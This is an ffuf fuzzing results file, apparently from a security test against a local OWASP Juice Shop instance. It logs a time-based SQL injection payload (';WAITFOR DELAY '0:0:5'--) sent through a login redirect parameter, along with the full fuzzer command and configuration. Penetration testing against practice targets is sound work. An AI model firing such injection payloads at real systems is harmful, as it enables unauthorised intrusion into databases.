{"commandline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/6264d5f0-9939-4c0a-b210-359af4c2694f.txt -u http://localhost:8082/login?return_to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop#/login\u0026return_to=FUZZ -of json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755682288909.json","time":"2025-08-20T17:31:28+08:00","results":[{"input":{"FFUFHASH":"bb67b1","FUZZ":"';WAITFOR DELAY '0:0:5'--"},"position":1,"status":200,"length":80117,"words":3629,"lines":34,"content-type":"text/html; charset=UTF-8","redirectlocation":"","scraper":{},"duration":8324041,"resultfile":"","url":"http://localhost:8082/login?return_to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop#/login\u0026return_to=';WAITFOR DELAY '0:0:5'--","host":"localhost:8082"}],"config":{"autocalibration":false,"autocalibration_keyword":"FUZZ","autocalibration_perhost":false,"autocalibration_strategies":["basic"],"autocalibration_strings":[],"colors":false,"cmdline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/6264d5f0-9939-4c0a-b210-359af4c2694f.txt -u http://localhost:8082/login?return_to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop#/login\u0026return_to=FUZZ -of json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755682288909.json","configfile":"","postdata":"","debuglog":"","delay":{"value":"0.00"},"dirsearch_compatibility":false,"encoders":[],"extensions":[],"fmode":"or","follow_redirects":false,"headers":{},"ignorebody":false,"ignore_wordlist_comments":false,"inputmode":"clusterbomb","cmd_inputnum":100,"inputproviders":[{"name":"wordlist","keyword":"FUZZ","value":"/Users/raphaelpang/code/elise/payloads/temp/6264d5f0-9939-4c0a-b210-359af4c2694f.txt","encoders":"","template":""}],"inputshell":"","json":false,"matchers":{"IsCalibrated":false,"Mutex":{},"Matchers":{"status":{"value":"200-299,301,302,307,401,403,405,500"}},"Filters":{},"PerDomainFilters":{}},"mmode":"or","maxtime":0,"maxtime_job":0,"method":"GET","noninteractive":false,"outputdirectory":"","outputfile":"/Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755682288909.json","outputformat":"json","OutputSkipEmptyFile":false,"proxyurl":"","quiet":false,"rate":0,"raw":false,"recursion":false,"recursion_depth":0,"recursion_strategy":"default","replayproxyurl":"","requestfile":"","requestproto":"https","scraperfile":"","scrapers":"all","sni":"","stop_403":false,"stop_all":false,"stop_errors":false,"threads":40,"timeout":10,"url":"http://localhost:8082/login?return_to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop#/login\u0026return_to=FUZZ","verbose":false,"wordlists":["/Users/raphaelpang/code/elise/payloads/temp/6264d5f0-9939-4c0a-b210-359af4c2694f.txt"],"http2":false,"client-cert":"","client-key":""}}